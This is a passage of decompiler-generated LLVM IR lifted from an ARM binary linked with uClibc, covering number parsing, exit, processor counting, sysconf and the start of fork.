  %v1_13b2430 = phi i32 [ %v0_139c8, %bb61 ], [ %v1_13a34, %bb62 ], [ %v1_13a34, %dec_label_pc_13a34 ]
  %v0_13aa021 = phi i32 [ %v0_13a34, %bb61 ], [ %v2_13a50, %bb62 ], [ %v1_13a34, %dec_label_pc_13a34 ]
  %v0_13a54 = phi i32 [ %v1_13a28, %bb61 ], [ %v3_13a4c, %bb62 ], [ %v1_13a40, %dec_label_pc_13a34 ]
  %v5_13a58 = icmp slt i32 %v0_13a54, 16
  br i1 %v5_13a58, label %bb64, label %bb63

bb63:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %bb60, %.thread8, %bb63
  %v1_13b2429 = phi i32 [ %v0_139c8, %bb60 ], [ %v1_13b2430, %.thread8 ], [ %v1_13b2430, %bb63 ]
  %v0_13aa020 = phi i32 [ %v0_13a34, %bb60 ], [ %v0_13aa021, %.thread8 ], [ %v0_13aa021, %bb63 ]
  %v0_13a80 = phi i32 [ %v0_139c4, %bb60 ], [ %v0_13a54, %.thread8 ], [ 16, %bb63 ]
  %v1_13a5c = add i32 %v0_13a80, -2
  %tmp = icmp ugt i32 %v1_13a5c, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_13a6c

.thread:                                          ; preds = %bb64
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b20

dec_label_pc_13a6c:                               ; preds = %bb64
  %v2_13a74 = udiv i32 -1, %v0_13a80
  %v3_13a74 = urem i32 -1, %v0_13a80
  store i32 %v0_13a80, i32* %r1.global-to-local, align 4
  %v1_13a84 = urem i32 %v3_13a74, 256
  store i32 %v1_13a84, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i32 %v2_13a74, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13aa0

dec_label_pc_13a9c:                               ; preds = %bb71, %dec_label_pc_13afc
  %v0_13a9c = phi i32 [ %v1_13adc44, %bb71 ], [ %v0_13a9c.pre, %dec_label_pc_13afc ]
  br label %dec_label_pc_13aa0

dec_label_pc_13aa0:                               ; preds = %dec_label_pc_13a6c, %dec_label_pc_13a9c
  %v1_13b2427 = phi i32 [ %v1_13b2429, %dec_label_pc_13a6c ], [ %v0_13a9c, %dec_label_pc_13a9c ]
  %v0_13adc = phi i32 [ %v0_13aa020, %dec_label_pc_13a6c ], [ %v0_13a9c, %dec_label_pc_13a9c ]
  %v1_13aa0 = inttoptr i32 %v0_13adc to i8*
  %v2_13aa0 = load i8, i8* %v1_13aa0, align 1
  %v3_13aa0 = zext i8 %v2_13aa0 to i32
  %v1_13aa4 = add nsw i32 %v3_13aa0, -48
  %v1_13aa8 = urem i32 %v1_13aa4, 256
  store i32 %v1_13aa8, i32* %r1.global-to-local, align 4
  %v1_13ab0 = or i32 %v3_13aa0, 32
  %tmp79 = icmp ult i32 %v1_13aa8, 10
  br i1 %tmp79, label %bb66, label %dec_label_pc_13ab8

dec_label_pc_13ab8:                               ; preds = %dec_label_pc_13aa0
  store i32 40, i32* %r1.global-to-local, align 4
  %tmp80 = icmp ugt i32 %v1_13ab0, 96
  br i1 %tmp80, label %bb65, label %bb66

bb65:                                             ; preds = %dec_label_pc_13ab8
  %v1_13abc = add nsw i32 %v1_13ab0, -87
  %v5_13ac4 = urem i32 %v1_13abc, 256
  store i32 %v5_13ac4, i32* %r1.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_13aa0, %dec_label_pc_13ab8, %bb65
  %v3_13af4 = phi i32 [ %v1_13aa8, %dec_label_pc_13aa0 ], [ 40, %dec_label_pc_13ab8 ], [ %v5_13ac4, %bb65 ]
  %v1_13ac8 = load i32, i32* %r5.global-to-local, align 4
  %v6_13acc = icmp slt i32 %v3_13af4, %v1_13ac8
  br i1 %v6_13acc, label %dec_label_pc_13ad0, label %dec_label_pc_13b20.loopexit

dec_label_pc_13ad0:                               ; preds = %bb66
  %v0_13ad0 = load i32, i32* %ip.global-to-local, align 4
  %v1_13ad0 = load i32, i32* %r8.global-to-local, align 4
  %v9_13ad0 = icmp eq i32 %v0_13ad0, %v1_13ad0
  br i1 %v9_13ad0, label %.thread39, label %bb67

.thread39:                                        ; preds = %dec_label_pc_13ad0
  %v1_13adc40 = add i32 %v0_13adc, 1
  store i32 %v1_13adc40, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13ae4

bb67:                                             ; preds = %dec_label_pc_13ad0
  %v3_13ad0 = icmp ult i32 %v0_13ad0, %v1_13ad0
  %v1_13adc = add i32 %v0_13adc, 1
  store i32 %v1_13adc, i32* %r4.global-to-local, align 4
  br i1 %v3_13ad0, label %dec_label_pc_13ae4, label %dec_label_pc_13afc

dec_label_pc_13ae4:                               ; preds = %bb67, %.thread39
  %v1_13adc44 = phi i32 [ %v1_13adc40, %.thread39 ], [ %v1_13adc, %bb67 ]
  %v4_13aec2443 = phi i32 [ 1, %.thread39 ], [ 0, %bb67 ]
  %v1_13ae4 = load i32, i32* %sl.global-to-local, align 4
  %v3_13ae4 = icmp uge i32 %v3_13af4, %v1_13ae4
  %v9_13ae4 = icmp eq i32 %v3_13af4, %v1_13ae4
  %v2_13ae8 = xor i1 %v3_13ae4, true
  %v3_13ae8 = or i1 %v9_13ae4, %v2_13ae8
  br i1 %v3_13ae8, label %bb68, label %bb69

bb68:                                             ; preds = %dec_label_pc_13ae4
  br label %bb69

bb69:                                             ; preds = %dec_label_pc_13ae4, %bb68
  %v4_13aec = phi i32 [ %v4_13aec2443, %dec_label_pc_13ae4 ], [ 0, %bb68 ]
  %v2_13aec = xor i1 %v9_13ae4, true
  %v3_13aec = and i1 %v3_13ae4, %v2_13aec
  br i1 %v3_13aec, label %bb70, label %thread-pre-split

bb70:                                             ; preds = %bb69
  %v5_13aec = urem i32 %v4_13aec, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb69, %bb70
  %v0_13af0 = phi i32 [ %v5_13aec, %bb70 ], [ %v4_13aec, %bb69 ]
  %v2_13af0 = icmp eq i32 %v0_13af0, 0
  br i1 %v2_13af0, label %bb71, label %dec_label_pc_13afc

bb71:                                             ; preds = %thread-pre-split
  %v4_13af4 = mul i32 %v0_13ad0, %v1_13ac8
  %v5_13af4 = add i32 %v4_13af4, %v3_13af4
  store i32 %v5_13af4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13afc:                               ; preds = %bb67, %thread-pre-split
  %v0_13b04 = call i32 @__aeabi_read_tp()
  %v0_13b08 = load i32, i32* %r7.global-to-local, align 4
  %v2_13b08 = and i32 %v0_139cc, %v0_13b08
  store i32 %v2_13b08, i32* %r7.global-to-local, align 4
  %v0_13b0c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_13b0c, i32* %ip.global-to-local, align 4
  %v3_13b10 = load i16, i16* @global_var_2229c.359, align 2
  %v4_13b10 = sext i16 %v3_13b10 to i32
  %v3_13b18 = add i32 %v4_13b10, %v0_13b04
  %v4_13b18 = inttoptr i32 %v3_13b18 to i32*
  store i32 34, i32* %v4_13b18, align 4
  %v0_13a9c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13a9c

dec_label_pc_13b20.loopexit:                      ; preds = %bb66
  %v0_13b20.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_13b20

dec_label_pc_13b20:                               ; preds = %.thread, %dec_label_pc_13b20.loopexit
  %v1_13b24 = phi i32 [ %v1_13b2427, %dec_label_pc_13b20.loopexit ], [ %v1_13b2429, %.thread ]
  %v2_13b24 = phi i32 [ %v0_13b20.pre, %dec_label_pc_13b20.loopexit ], [ %v0_139c0, %.thread ]
  %v2_13b20 = icmp eq i32 %v2_13b24, 0
  br i1 %v2_13b20, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_13b20
  %v3_13b24 = inttoptr i32 %v2_13b24 to i32*
  store i32 %v1_13b24, i32* %v3_13b24, align 4
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_13b20, %bb72
  %v0_13b2c = load i32, i32* %r7.global-to-local, align 4
  %v2_13b2c = icmp eq i32 %v0_13b2c, 0
  %. = select i1 %v2_13b2c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r1.global-to-local, align 4
  %v2_13b38 = icmp eq i32 %v0_139cc, 0
  %v0_13b64.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_13b38, label %dec_label_pc_13b5c, label %bb76

bb76:                                             ; preds = %bb73
  %tmp81 = icmp ugt i32 %v0_13b64.pre.pre, %.
  br i1 %tmp81, label %dec_label_pc_13b44, label %dec_label_pc_13b5c

dec_label_pc_13b44:                               ; preds = %bb76
  %v0_13b48 = call i32 @__aeabi_read_tp()
  %v3_13b4c = load i16, i16* @global_var_2229c.359, align 2
  %v4_13b4c = sext i16 %v3_13b4c to i32
  %v3_13b54 = add i32 %v4_13b4c, %v0_13b48
  %v4_13b54 = inttoptr i32 %v3_13b54 to i32*
  store i32 34, i32* %v4_13b54, align 4
  %v0_13b58 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13b58, i32* %ip.global-to-local, align 4
  %v0_13b5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13b5c

dec_label_pc_13b5c:                               ; preds = %bb76, %bb73, %dec_label_pc_13b44
  %v0_13b64.pre = phi i32 [ %v0_13b64.pre.pre, %bb76 ], [ %v0_13b58, %dec_label_pc_13b44 ], [ %v0_13b64.pre.pre, %bb73 ]
  %v0_13b5c = phi i32 [ %v0_13b2c, %bb76 ], [ %v0_13b5c.pre, %dec_label_pc_13b44 ], [ %v0_13b2c, %bb73 ]
  %v2_13b5c = icmp eq i32 %v0_13b5c, 0
  br i1 %v2_13b5c, label %dec_label_pc_13b5c._crit_edge, label %bb77

bb77:                                             ; preds = %dec_label_pc_13b5c
  %v2_13b60 = sub i32 0, %v0_13b64.pre
  store i32 %v2_13b60, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_13b5c._crit_edge

dec_label_pc_13b5c._crit_edge:                    ; preds = %dec_label_pc_13b5c, %bb77
  %v0_13b64 = phi i32 [ %v2_13b60, %bb77 ], [ %v0_13b64.pre, %dec_label_pc_13b5c ]
  ret i32 %v0_13b64

; uselistorder directives
  uselistorder i32 %v0_13b64.pre, { 1, 0 }
  uselistorder i32 %v0_13b64.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_13aec, { 1, 0 }
  uselistorder i1 %v3_13ae4, { 1, 0 }
  uselistorder i32 %v1_13ae4, { 1, 0 }
  uselistorder i32 %v5_13ac4, { 1, 0 }
  uselistorder i32 %v1_13ab0, { 1, 0 }
  uselistorder i32 %v1_13aa8, { 2, 0, 1 }
  uselistorder i32 %v0_13adc, { 1, 0, 2 }
  uselistorder i32 %v0_13a9c, { 1, 0 }
  uselistorder i32 %v3_13a4c, { 1, 0 }
  uselistorder i32 %v1_13a40, { 1, 0, 2 }
  uselistorder i32 %v0_13a34, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_13a10, { 0, 1, 3, 2 }
  uselistorder i32 %v0_139cc, { 1, 0 }
  uselistorder i32 %v0_139c8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_139c4, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r5.global-to-local, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 6, 0, 7, 1, 2, 3, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 0, 1, 2, 3, 4 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 7, 8 }
  uselistorder i32 34, { 1, 2, 0, 4, 6, 3, 7, 5 }
  uselistorder i8 48, { 1, 0, 2 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder label %dec_label_pc_13b5c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_13b5c, { 2, 0, 1 }
  uselistorder label %bb73, { 1, 0 }
  uselistorder label %dec_label_pc_13b20, { 1, 0 }
  uselistorder label %dec_label_pc_13afc, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb69, { 1, 0 }
  uselistorder label %bb66, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13aa0, { 1, 0 }
  uselistorder label %dec_label_pc_13a9c, { 1, 0 }
  uselistorder label %bb64, { 2, 1, 0 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13a14, { 1, 0 }
  uselistorder label %dec_label_pc_13a10, { 1, 0 }
  uselistorder label %dec_label_pc_139d8, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r5, align 4
  %v4_13b90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 140) to i32*), align 4
  store i32 %v4_13b90, i32* @r4, align 4
  %v2_13b98 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_13bb0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_13bb0)
  %v0_13bc4 = load i32, i32* @r5, align 4
  %v2_13bc4 = add i32 %v0_13bc4, 16
  %v3_13bc4 = inttoptr i32 %v2_13bc4 to i32*
  %v4_13bc4 = load i32, i32* %v3_13bc4, align 4
  call void @__pseudo_branch(i32 %v4_13bc4)
  %v0_13bd4 = load i32, i32* @r5, align 4
  %v2_13bd4 = add i32 %v0_13bd4, 636
  %v3_13bd4 = inttoptr i32 %v2_13bd4 to i32*
  %v4_13bd4 = load i32, i32* %v3_13bd4, align 4
  %v2_13bdc = icmp eq i32 %v4_13bd4, 0
  br i1 %v2_13bdc, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_13be8 = xor i1 %v2_13bdc, true
  call void @__pseudo_cond_branch(i1 %v2_13be8, i32 %v4_13bd4)
  store i32 %v2_13b98, i32* @r0, align 4
  %v0_13bf8 = load i32, i32* @r5, align 4
  %v2_13bf8 = add i32 %v0_13bf8, 44
  %v3_13bf8 = inttoptr i32 %v2_13bf8 to i32*
  %v4_13bf8 = load i32, i32* %v3_13bf8, align 4
  call void @__pseudo_branch(i32 %v4_13bf8)
  %v0_13c04 = call i32 @__GI___uClibc_fini()
  %v0_13c0c = load i32, i32* @r5, align 4
  %v2_13c0c = add i32 %v0_13c0c, -47808
  %v2_13c14 = icmp eq i32 %v2_13c0c, 0
  br i1 %v2_13c14, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_13c1c = xor i1 %v2_13c14, true
  call void @__pseudo_cond_branch(i1 %v2_13c1c, i32 %v2_13c0c)
  %v0_13c20 = load i32, i32* @r6, align 4
  %v1_13c24 = call i32 @__GI__exit(i32 %v0_13c20)
  %v0_13c28 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13c28, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_13c28 = load i32, i32* @lr, align 4
  %v2_13c28 = trunc i32 %v1_13c28 to i16
  %v4_13c28 = inttoptr i32 %v1_13c24 to i16*
  store i16 %v2_13c28, i16* %v4_13c28, align 2
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_13c40 = phi i32 [ %v1_13c24, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_13c40

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -34012), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_13c68 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 -34012))
  store i32 %v1_13c68, i32* @r6, align 4
  %v2_13c6c = icmp eq i32 %v1_13c68, 0
  br i1 %v2_13c6c, label %dec_label_pc_13cec, label %dec_label_pc_13c74

dec_label_pc_13c74:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_13c7c = load i32, i32* @r4, align 4
  %v2_13c7c = add i32 %v0_13c7c, -34000
  store i32 %v2_13c7c, i32* @r8, align 4
  %v2_13c80 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13c80, i32* @r7, align 4
  br label %bb18

dec_label_pc_13c88:                               ; preds = %bb18
  %v3_13c88 = load i32, i32* %stack_var_-36, align 4
  %v1_13c8c = inttoptr i32 %v3_13c88 to i32*
  %v2_13c8c = load i32, i32* %v1_13c8c, align 4
  %v1_13c90 = inttoptr i32 %v2_13c8c to i8*
  %v2_13c90 = load i8, i8* %v1_13c90, align 1
  %v7_13c94 = icmp eq i8 %v2_13c90, 99
  br i1 %v7_13c94, label %dec_label_pc_13c9c, label %.backedge3

dec_label_pc_13c9c:                               ; preds = %dec_label_pc_13c88
  %v1_13c9c = add i32 %v2_13c8c, 1
  %v2_13c9c = inttoptr i32 %v1_13c9c to i8*
  %v3_13c9c = load i8, i8* %v2_13c9c, align 1
  %v7_13ca0 = icmp eq i8 %v3_13c9c, 112
  br i1 %v7_13ca0, label %dec_label_pc_13ca8, label %.backedge3

dec_label_pc_13ca8:                               ; preds = %dec_label_pc_13c9c
  %v1_13ca8 = add i32 %v2_13c8c, 2
  %v2_13ca8 = inttoptr i32 %v1_13ca8 to i8*
  %v3_13ca8 = load i8, i8* %v2_13ca8, align 1
  %v7_13cac = icmp eq i8 %v3_13ca8, 117
  br i1 %v7_13cac, label %dec_label_pc_13cb4, label %.backedge3

dec_label_pc_13cb4:                               ; preds = %dec_label_pc_13ca8
  %v1_13cb4 = add i32 %v2_13c8c, 3
  %v2_13cb4 = inttoptr i32 %v1_13cb4 to i8*
  %v3_13cb4 = load i8, i8* %v2_13cb4, align 1
  %v4_13cb4 = zext i8 %v3_13cb4 to i32
  %v0_13cb8 = load i32, i32* @r4, align 4
  %v1_13cb8 = load i32, i32* @sl, align 4
  %v2_13cb8 = add i32 %v1_13cb8, %v0_13cb8
  %v3_13cb8 = inttoptr i32 %v2_13cb8 to i32*
  %v4_13cb8 = load i32, i32* %v3_13cb8, align 4
  %v2_13cbc = mul nuw nsw i32 %v4_13cb4, 2
  %v2_13cc0 = add i32 %v4_13cb8, %v2_13cbc
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i16*
  %v4_13cc0 = load i16, i16* %v3_13cc0, align 2
  %v1_13cc4 = and i16 %v4_13cc0, 8
  %v2_13cc4 = icmp eq i16 %v1_13cc4, 0
  br i1 %v2_13cc4, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_13cb4
  %v1_13cc8 = load i32, i32* @r5, align 4
  %v2_13cc8 = add i32 %v1_13cc8, 1
  store i32 %v2_13cc8, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_13cb4, %dec_label_pc_13c88, %dec_label_pc_13c9c, %dec_label_pc_13ca8
  %v0_13ccc.pre = load i32, i32* @r6, align 4
  %v0_13cd8.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_13c74
  %v0_13cd8 = phi i32 [ %v0_13cd8.pre, %.backedge3 ], [ %v2_13c7c, %dec_label_pc_13c74 ]
  %v0_13ccc = phi i32 [ %v0_13ccc.pre, %.backedge3 ], [ %v1_13c68, %dec_label_pc_13c74 ]
  %v4_13cdc = inttoptr i32 %v0_13ccc to i32*
  %v5_13cdc = call i32 @__GI_config_read(i32* %v4_13cdc, i32 %v2_13c80, i32 258, i32 %v0_13cd8)
  %v2_13ce0 = icmp eq i32 %v5_13cdc, 0
  br i1 %v2_13ce0, label %dec_label_pc_13d50, label %dec_label_pc_13c88

dec_label_pc_13cec:                               ; preds = %entry
  %v0_13cf0 = load i32, i32* @r4, align 4
  %v2_13cf0 = add i32 %v0_13cf0, -33996
  store i32 %v2_13cf0, i32* @r0, align 4
  %v1_13cf4 = call i32 @__GI_config_open(i32 %v2_13cf0)
  store i32 %v1_13cf4, i32* @r6, align 4
  %v2_13cf8 = icmp eq i32 %v1_13cf4, 0
  br i1 %v2_13cf8, label %bb19, label %dec_label_pc_13d04

bb19:                                             ; preds = %dec_label_pc_13cec
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_13d50

dec_label_pc_13d04:                               ; preds = %dec_label_pc_13cec
  %v0_13d08 = load i32, i32* @r4, align 4
  %v2_13d08 = add i32 %v0_13d08, -33980
  store i32 %v2_13d08, i32* @r8, align 4
  %v2_13d10 = add i32 %v0_13d08, -33944
  store i32 %v2_13d10, i32* @r7, align 4
  %v2_13d14 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_13d14, i32* @r4, align 4
  br label %bb21

dec_label_pc_13d1c:                               ; preds = %bb21
  %v0_13d48 = load i32, i32* @r8, align 4
  %v3_13d1c = load i32, i32* %stack_var_-36, align 4
  %v1_13d20 = inttoptr i32 %v3_13d1c to i32*
  %v2_13d20 = load i32, i32* %v1_13d20, align 4
  store i32 %v2_13d20, i32* @r1, align 4
  %v2_13d24 = inttoptr i32 %v0_13d48 to i8*
  %v3_13d24 = call i32 @__GI_strcoll(i8* %v2_13d24, i32 %v2_13d20)
  %v2_13d28 = icmp eq i32 %v3_13d24, 0
  br i1 %v2_13d28, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_13d1c
  %v1_13d2c = load i32, i32* @r5, align 4
  %v2_13d2c = add i32 %v1_13d2c, 1
  store i32 %v2_13d2c, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_13d1c
  %v0_13d38.pre = load i32, i32* @r7, align 4
  %v0_13d3c.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_13d04
  %v0_13d3c = phi i32 [ %v0_13d3c.pre, %.backedge ], [ %v1_13cf4, %dec_label_pc_13d04 ]
  %v0_13d38 = phi i32 [ %v0_13d38.pre, %.backedge ], [ %v2_13d10, %dec_label_pc_13d04 ]
  %v4_13d40 = inttoptr i32 %v0_13d3c to i32*
  %v5_13d40 = call i32 @__GI_config_read(i32* %v4_13d40, i32 %v2_13d14, i32 459266, i32 %v0_13d38)
  %v2_13d44 = icmp eq i32 %v5_13d40, 0
  br i1 %v2_13d44, label %dec_label_pc_13d50, label %dec_label_pc_13d1c

dec_label_pc_13d50:                               ; preds = %bb18, %bb21, %bb19
  %v0_13d50 = load i32, i32* @r6, align 4
  %v1_13d54 = inttoptr i32 %v0_13d50 to i32*
  %v2_13d54 = call i32 @__GI_config_close(i32* %v1_13d54)
  %v0_13d58 = load i32, i32* @r5, align 4
  %v2_13d58 = icmp eq i32 %v0_13d58, 0
  %.v0_13d58 = select i1 %v2_13d58, i32 1, i32 %v0_13d58
  ret i32 %.v0_13d58

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_13d50, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_14184

bb:                                               ; preds = %entry
  %v7_13da8 = mul i32 %arg1, 4
  %v8_13da8 = add i32 %v7_13da8, ptrtoint (i32* @global_var_13db0.513 to i32)
  call void @__pseudo_branch(i32 %v8_13da8)
  br label %dec_label_pc_14184

dec_label_pc_14184:                               ; preds = %bb, %entry
  %v0_14188 = call i32 @__aeabi_read_tp()
  %v3_1418c = load i16, i16* @global_var_2229c.359, align 2
  %v4_1418c = sext i16 %v3_1418c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14198 = add i32 %v4_1418c, %v0_14188
  %v4_14198 = inttoptr i32 %v3_14198 to i32*
  store i32 22, i32* %v4_14198, align 4
  %v0_1437c = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_1437c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12820, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r8.global-to-local, align 4
  %v4_144a816 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 12820) to i32*), align 4
  store i32 %v4_144a816, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144ac18 = icmp eq i32 %v4_144a816, 0
  br i1 %v2_144ac18, label %dec_label_pc_144b4, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %entry, %dec_label_pc_144a8.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_143e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_143e4 = add i32 %v0_143e4, 20
  %v2_143e4 = inttoptr i32 %v1_143e4 to i32*
  %v3_143e4 = load i32, i32* %v2_143e4, align 4
  store i32 %v3_143e4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_143e8 = icmp eq i32 %v3_143e4, 0
  store i32 %v3_143e4, i32* %r4.global-to-local, align 4
  br i1 %v2_143e8, label %dec_label_pc_144a8.backedge, label %dec_label_pc_143f8

dec_label_pc_144a8.backedge:                      ; preds = %dec_label_pc_143d8, %dec_label_pc_14424
  %v0_144a8 = load i32, i32* %r8.global-to-local, align 4
  %v1_144a8 = load i32, i32* %r5.global-to-local, align 4
  %v2_144a8 = add i32 %v1_144a8, %v0_144a8
  %v3_144a8 = inttoptr i32 %v2_144a8 to i32*
  %v4_144a8 = load i32, i32* %v3_144a8, align 4
  store i32 %v4_144a8, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_144ac = icmp eq i32 %v4_144a8, 0
  br i1 %v2_144ac, label %dec_label_pc_144b4, label %dec_label_pc_143d8

dec_label_pc_143f8:                               ; preds = %dec_label_pc_143d8
  %v0_143f8 = load i32, i32* %r8.global-to-local, align 4
  %v1_143f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_143f8 = add i32 %v1_143f8, %v0_143f8
  %v3_143f8 = inttoptr i32 %v2_143f8 to i32*
  %v4_143f8 = load i32, i32* %v3_143f8, align 4
  %v1_143fc = add i32 %v4_143f8, 20
  store i32 %v1_143fc, i32* %r2.global-to-local, align 4
  %v1_14400132 = inttoptr i32 %v1_143fc to i32*
  %v2_14400133 = load i32, i32* %v1_14400132, align 4
  store i32 %v2_14400133, i32* %r3.global-to-local, align 4
  %v3_14404135 = icmp uge i32 %v2_14400133, %v3_143e4
  store i1 %v3_14404135, i1* %cpsr_c.global-to-local, align 1
  %v9_14404141 = icmp eq i32 %v2_14400133, %v3_143e4
  br i1 %v9_14404141, label %dec_label_pc_1440c, label %dec_label_pc_14424

dec_label_pc_1440c:                               ; preds = %dec_label_pc_143f8, %dec_label_pc_1440c.dec_label_pc_14400_crit_edge
  %v0_1440c142 = phi i32 [ %v1_14404.pre, %dec_label_pc_1440c.dec_label_pc_14400_crit_edge ], [ %v3_143e4, %dec_label_pc_143f8 ]
  store i32 %v0_1440c142, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1441c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1441c, label %dec_label_pc_14420, label %dec_label_pc_1440c.dec_label_pc_14400_crit_edge

dec_label_pc_1440c.dec_label_pc_14400_crit_edge:  ; preds = %dec_label_pc_1440c
  %v0_14400.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14404.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14400 = inttoptr i32 %v0_14400.pre to i32*
  %v2_14400 = load i32, i32* %v1_14400, align 4
  store i32 %v2_14400, i32* %r3.global-to-local, align 4
  %v3_14404 = icmp uge i32 %v2_14400, %v1_14404.pre
  store i1 %v3_14404, i1* %cpsr_c.global-to-local, align 1
  %v9_14404 = icmp eq i32 %v2_14400, %v1_14404.pre
  br i1 %v9_14404, label %dec_label_pc_1440c, label %dec_label_pc_14424

dec_label_pc_14420:                               ; preds = %dec_label_pc_1440c
  %v0_14420 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14420, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14424

